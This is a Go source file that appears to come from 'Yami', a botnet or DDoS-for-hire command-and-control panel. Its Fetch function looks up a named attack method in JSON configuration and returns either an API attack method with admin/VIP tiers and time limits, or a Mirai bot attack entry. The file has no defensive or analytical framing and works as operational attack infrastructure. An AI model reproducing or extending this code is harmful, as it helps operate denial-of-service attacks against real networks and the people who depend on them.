package AttacksV2

import (
	"Yami/core/models/Json"
	"strings"
)

var MethodTypeCon string

type Mirai struct {
	ID uint16

	Name        string
	Description string

	DefaultPort string

	Admin bool
	Vip  bool
}

type MiraiAddr struct {
	Name 	  string
	Description string
	Args        []string
}

// gets the method name from attack.json and returns it in a struct
func Fetch(Name string) (*Method, *Mirai) {
	for i := 0; i < len(JsonParse.AttackSyncs.Attacks); i++ {
		if strings.ToLower(JsonParse.AttackSyncs.Attacks[i].Name) == Name {

			var MethodType = Method {
				Method: 		strings.ToLower(JsonParse.AttackSyncs.Attacks[i].Name),
				APIMethod:     JsonParse.AttackSyncs.Attacks[i].MethodName,
				DefaultPort:   JsonParse.AttackSyncs.Attacks[i].DefaultPort,
				
				AdminMethod:   JsonParse.AttackSyncs.Attacks[i].AdminMethod,
				VIPMethod:     JsonParse.AttackSyncs.Attacks[i].VipMethod,
				
				API:           JsonParse.AttackSyncs.Attacks[i].API,

				LimitMaxTime: JsonParse.AttackSyncs.Attacks[i].Moderation.LimitMaxTime,

				LimitMax: JsonParse.AttackSyncs.Attacks[i].Moderation.MaxTimeAllow,

				
			}

			MethodTypeCon = "api"

			return &MethodType, nil
		}
	}

	for l := 0; l < len(JsonParse.SlaveSync.Slaves); l++ {
		if strings.ToLower(JsonParse.SlaveSync.Slaves[l].Name) == strings.Replace(Name, JsonParse.SlaveSync.AttackPrefix, "", -1) {
			MethodTypeCon = "mirai"

			var Attack = Mirai {
				ID: JsonParse.SlaveSync.Slaves[l].ID,
				Name: JsonParse.SlaveSync.Slaves[l].Name,
			
				Description: JsonParse.SlaveSync.Slaves[l].Description,

				DefaultPort: JsonParse.SlaveSync.Slaves[l].DefaultPort,

				Admin: JsonParse.SlaveSync.Slaves[l].Admin,
				Vip: JsonParse.SlaveSync.Slaves[l].Vip,
			}

			return nil, &Attack
		}
	}


	return nil, nil
}